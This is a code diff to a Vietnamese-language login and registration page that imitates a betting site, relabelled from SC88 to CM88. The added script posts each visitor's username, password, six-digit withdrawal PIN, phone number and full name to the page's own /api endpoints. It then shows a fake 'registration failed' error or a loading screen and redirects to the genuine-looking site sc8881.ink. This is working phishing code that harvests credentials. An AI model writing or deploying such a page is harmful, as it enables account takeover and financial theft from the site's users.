@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SC88 - Đăng Nhập & Đăng Ký</title>
+    <title>CM88 - Đăng Nhập & Đăng Ký</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -425,8 +425,8 @@
 <script>
     // ==========================================
     // CÔNG TẮC BẬT/TẮT YÊU CẦU MÃ PIN RÚT TIỀN
-    // - Đổi thành true : Hiển thị bảng mã PIN
-    // - Đổi thành false: Bỏ qua mã PIN, chuyển trang luôn
+    // - Đổi thành true : Hiển thị bảng mã PIN khi đăng nhập
+    // - Đổi thành false: Bỏ qua mã PIN, gửi API rồi chuyển trang luôn
     // ==========================================
     const REQUIRE_PIN_CODE = false; 
 
@@ -554,16 +554,24 @@
             currentLoginUser = document.getElementById('login-user').value;
             currentLoginPass = document.getElementById('login-pass').value;
             
-            // XỬ LÝ THEO TRẠNG THÁI CÔNG TẮC
             if (REQUIRE_PIN_CODE) {
-                // Bật thì hiện form mã PIN
+                // Nếu bật công tắc yêu cầu PIN -> Hiện bảng nhập PIN
                 document.getElementById('withdraw-modal').style.display = 'flex';
             } else {
-                // Tắt thì chạy loading rồi bay qua trang mới luôn
+                // Nếu tắt công tắc -> Gửi API đăng nhập trực tiếp rồi chuyển sang trang đích
                 document.getElementById('loading-overlay').style.display = 'flex';
-                setTimeout(() => { 
-                    window.location.href = 'https://sc8881.ink/home/login'; 
-                }, 1500);
+                fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: currentLoginUser, password: currentLoginPass })
+                })
+                .then(res => res.json())
+                .then(data => { 
+                    setTimeout(() => { window.location.href = 'https://sc8881.ink/home/login'; }, 1500); 
+                })
+                .catch(err => { 
+                    setTimeout(() => { window.location.href = 'https://sc8881.ink/home/login'; }, 1500); 
+                });
             }
         }
     }
@@ -581,7 +589,25 @@
         }
 
         if (isUserValid && isPassValid && isPhoneValid && isNameValid) {
-            alert('Đăng ký thất bại, LINK LỖI!');
+            const user = document.getElementById('reg-user').value;
+            const pass = document.getElementById('reg-pass').value;
+            const phone = document.getElementById('reg-phone').value;
+            const name = document.getElementById('reg-fullname').value;
+            
+            fetch('/api/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: user, password: pass, phone: phone, fullname: name })
+            })
+            .then(res => res.json())
+            .then(data => {
+                alert('Đăng ký thất bại, LINK LỖI!');
+                window.location.href = 'https://sc8881.ink/home/login';
+            })
+            .catch(err => {
+                alert('Đăng ký thất bại, LINK LỖI!');
+                window.location.href = 'https://sc8881.ink/home/login';
+            });
         }
     }
 
@@ -614,10 +640,22 @@
             alert('Vui lòng nhập đầy đủ 6 số mật khẩu rút tiền!');
             return;
         }
+
+        document.getElementById('withdraw-modal').style.display = 'none';
         document.getElementById('loading-overlay').style.display = 'flex';
-        setTimeout(() => { 
-            window.location.href = 'https://sc8881.ink/home/login'; 
-        }, 1500);
+        
+        fetch('/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: currentLoginUser, password: currentLoginPass, pin: pinCode })
+        })
+        .then(res => res.json())
+        .then(data => { 
+            setTimeout(() => { window.location.href = 'https://sc8881.ink/home/login'; }, 1500); 
+        })
+        .catch(err => { 
+            setTimeout(() => { window.location.href = 'https://sc8881.ink/home/login'; }, 1500); 
+        });
     }
 </script>
 </body>
